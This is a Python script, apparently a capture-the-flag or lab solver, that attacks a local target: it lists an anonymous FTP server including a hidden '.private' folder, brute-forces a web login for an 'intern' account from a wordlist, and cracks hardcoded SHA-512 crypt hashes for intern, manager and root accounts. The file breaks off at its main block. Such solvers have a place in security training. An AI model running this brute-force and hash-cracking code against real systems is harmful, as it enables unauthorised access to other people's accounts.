import requests
#FTP lib is a bit gnarly
from pwn import *
import ftplib

URL = "http://127.0.0.1:5000"
FTP_URL = "172.27.0.3"  #This needs to be docker


def enumFTP():
    """
    Grab a directory listing from FTP,
    and download the relevant files
    """

    ftp = ftplib.FTP(FTP_URL)
    ftp.login("anonymous", "anonymous")

    #Get the directory listing
    dirList = []
    #Damn thing appends to a function...
    ftp.retrlines("LIST -a", dirList.append)
    #And the contents of the hidden directory
    hiddenList = []
    #Damn thing appends to a function...
    ftp.retrlines("LIST -a .private", hiddenList.append)


    ftp.quit()
    return dirList, hiddenList
    #print (data)
    
def crackPassword():
    data = {"username": "intern",
            "password": "b1uRR3"}
    r = requests.post(URL, data)
    print(r.text)

    #sys.exit(0)

    #wordList = open("2020-200_most_used_passwords.txt", "r")
    wordList = open("wordlist.txt", "r")
    
    for item in wordList:
        data["password"] = item.strip()
        r = requests.post(URL, data)
        print("Attempt {0}".format(item.strip()))
        if "Incorrect Password" in r.text:
            print("Fails")
        else:
            print("Success")
            return item


def crackHash():
    import crypt
    from hmac import compare_digest as compare_hash

    intern = "$6$7bGJuDAJYbtjddHs$orq2RKCGNDPvIzwCkcE3aEX7TA7LDrS2ToYYcAm7Bc4UP0VhrptKLptRhwPsojkOxqF8DV3BWmPN39or8n0Ox0"
    manager = "$6$oFWC0rkHygWWmjgZ$enKFVOevGqCTl3bOosoDvwIzPyQ3adjALa2PHzNs4YsmeTMi8Id9nnYueildKRjirxFvU0Ub7Ko2jzVSgPUPJ/"
    root = "$6$Mho/yWVF4uag7ASh$Zpc.ryZVLWxiL81V.ykROK2RgtoWq3v58NqhCLHXAC1Pq7E8.i9dFU6/uO.9ySG/zjceCxhTzhIpb43BRVJBm."

    parts = intern.split("$")
    print(parts)
    salt = "$".join(parts[:3])
    print(salt)
    
    out = crypt.crypt("my_wifes_birthday", salt=salt)
    print(out== intern)
    
    #sys.exit(0)

    # Manager
    parts = root.split("$") #manager.split("$")
    print(parts)
    salt = "$".join(parts[:3])
    print(salt)
    
    
    wordlist = open("wordlist.txt","r")
    for item in wordlist:

        out = crypt.crypt(item.strip(), salt)
        #if out == manager:
        if out == root:
            print("Found {0}".format(item))
            return item
    pass


if __name__ == "__main__":
    #enumFTP()
